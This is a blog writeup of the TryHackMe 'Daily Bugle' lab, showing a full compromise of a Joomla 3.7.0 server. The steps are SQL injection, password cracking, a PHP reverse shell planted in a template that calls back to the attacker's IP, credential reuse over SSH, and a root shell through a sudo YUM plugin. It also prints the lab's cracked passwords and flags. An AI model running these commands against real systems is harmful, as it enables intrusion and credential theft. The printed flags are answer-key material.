---
layout: post
title: Daily Bugle
subtitle: TryHackMe Writeup - Daily Bugle
description: Compromise a Joomla CMS account via SQL injection, crack password hashes, and escalate privileges using a YUM misconfiguration.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/5a1494ff275a366be8418a9bf831847c.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/5a1494ff275a366be8418a9bf831847c.png
category: tryhackme
tags:
  - TryHackMe
  - Joomla
  - SQL Injection
  - Privilege Escalation
  - Web Exploitation
author: Mustafa Altayeb
date: 2025-08-10 00:00
paginate: true
---

# Daily Bugle - TryHackMe Writeup

[Daily Bugle](https://tryhackme.com/room/dailybugle)

---

![Daily Bugle Banner](https://i.imgur.com/fREnB0x.png)

## Objectives
1. Gain initial access to the Linux server using a Joomla exploit.
2. Enumerate privilege escalation vectors using manual commands.
3. Exploit a YUM misconfiguration to gain root access.

---

## Reconnaissance

### Nmap Scan
Ran an Nmap scan to identify open ports and services:
```bash
nmap -sCV -Pn 10.10.172.83
```

**Results**:
```plaintext
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

**Key Findings**:
- **Port 22**: SSH (OpenSSH 7.4).
- **Port 80**: Apache httpd 2.4.6 running Joomla CMS, with `/administrator/` path and restricted directories in `robots.txt`.
- **Port 3306**: MariaDB 10.3.23 (unauthorized).

### Web Enumeration
Visited the web server on port 80, revealing a Joomla CMS:
![Spider Man](/assets/TryHackMeRoomsImage/DailyBugle/image1.png)

Checked the `/administrator/` path from the Nmap scan:
![Joomla CMS](/assets/TryHackMeRoomsImage/DailyBugle/image2.png)

Ran `dirsearch` to find hidden directories:
```bash
dirsearch -u http://10.10.172.83
```

**Results**:
```plaintext
[05:58:59] 200 -    4KB - /README.txt                                       
[05:59:00] 200 -  836B  - /robots.txt                                       
```

Found `README.txt`, which revealed Joomla version 3.7.0:
![README.txt](/assets/TryHackMeRoomsImage/DailyBugle/image3.png)

Searched for exploits for Joomla 3.7.0 and found a SQL injection exploit:
[Exploit-Joomla](https://github.com/stefanlucas/Exploit-Joomla)

Downloaded and ran the Python script:
```bash
python3 JoomlaExploit.py http://10.10.172.83
```

**Output**:
```plaintext
Fetching CSRF token
Testing SQLi
Found table: fb9j5_users
Extracting users from fb9j5_users
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
Extracting sessions from fb9j5_session
```

Cracked the password hash using `john`:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Output**:
```plaintext
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
spiderman123     (?)
1 password hash cracked, 0 left
```

**Credentials**:
- Username: `jonah`
- Password: `spiderman123`

---

## Initial Access

Logged into the Joomla admin panel (`/administrator/`) using `jonah:spiderman123`:
![Joomla Admin](/assets/TryHackMeRoomsImage/DailyBugle/image4.png)

### Exploit Execution
Navigated to **Extensions > Templates > Templates > Protostar Details and Files**. Edited `index.php` in the sidebar, replacing its content with a PHP reverse shell from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Modified the IP and port:
```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.14.109.66';  // CHANGE THIS
$port = 9999;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Saved the file and started a Netcat listener:
```bash
nc -nlvp 9999
```

Accessed the website to trigger the reverse shell:
```plaintext
listening on [any] 9999 ...
connect to [10.14.109.66] from (UNKNOWN) [10.10.172.83] 33668
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 06:37:17 up  1:10,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 
```

Enumerated directories and found `/var/www/html/configuration.php`, which contained database credentials:
```bash
sh-4.2$ cat /var/www/html/configuration.php
```

**Output**:
```php
<?php
class JConfig {
    public $offline = '0';
    public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
    public $display_offline_message = '1';
    public $offline_image = '';
    public $sitename = 'The Daily Bugle';
    public $editor = 'tinymce';
    public $captcha = '0';
    public $list_limit = '20';
    public $access = '1';
    public $debug = '0';
    public $debug_lang = '0';
    public $dbtype = 'mysqli';
    public $host = 'localhost';
    public $user = 'root';
    public $password = 'nv5uz9r3ZEDzVjNu';
    public $db = 'joomla';
    public $dbprefix = 'fb9j5_';
    public $live_site = '';
    public $secret = 'UAMBRWzHO3oFPmVC';
    public $gzip = '0';
}
```

**Key Finding**:
- Database credentials: `root:nv5uz9r3ZEDzVjNu`

Used these credentials to SSH as `jjameson`:
```bash
ssh jjameson@10.10.172.83
```

**Output**:
```plaintext
The authenticity of host '10.10.172.83 (10.10.172.83)' can't be established.
ED25519 key fingerprint is SHA256:Gvd5jH4bP7HwPyB+lGcqZ+NhGxa7MKX4wXeWBvcBbBY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.172.83' (ED25519) to the list of known hosts.
jjameson@10.10.172.83's password: nv5uz9r3ZEDzVjNu
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ ls
user.txt
```

---

## Privilege Escalation

Checked for `sudo` privileges:
```bash
sudo -l
```

**Output**:
```plaintext
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Found that `jjameson` can run `/usr/bin/yum` as `root` without a password. Used [GTFOBins](https://gtfobins.github.io/gtfobins/yum/) for privilege escalation:
![GTFOBins YUM](/assets/TryHackMeRoomsImage/DailyBugle/image5.png)

Attempted the `fpm` method, but `fpm` was not installed:
```bash
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```

**Output**:
```plaintext
-bash: fpm: command not found
```

Pivoted to the YUM plugin method:
```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

**Output**:
```plaintext
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
```

Achieved `root` access.

---

## Retrieving Flags

1. **User Flag**:
   Located in `/home/jjameson/user.txt`:
   ```bash
   cat /home/jjameson/user.txt
   ```
   **Output**:
   ```plaintext
   27a260fe3cba712cfdedb1c86d80442e
   ```

2. **Root Flag**:
   Located in `/root/root.txt`:
   ```bash
   cat /root/root.txt
   ```
   **Output**:
   ```plaintext
   eec3d53292b1821868266858d7fa6f79
   ```

---

## Summary
- **Reconnaissance**: Identified Joomla 3.7.0 on port 80 and MariaDB on port 3306 using Nmap and `dirsearch`.
- **Initial Access**: Exploited a SQL injection vulnerability (likely CVE-2017-8917) to extract credentials, logged into the Joomla admin panel, and deployed a PHP reverse shell. Found database credentials in `configuration.php` and used them to SSH as `jjameson`.
- **Privilege Escalation**: Exploited a `yum` misconfiguration to gain `root` access via a malicious YUM plugin.
- **Flags**: Retrieved `user.txt` and `root.txt`.

---


<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>

Follow me through these links
---

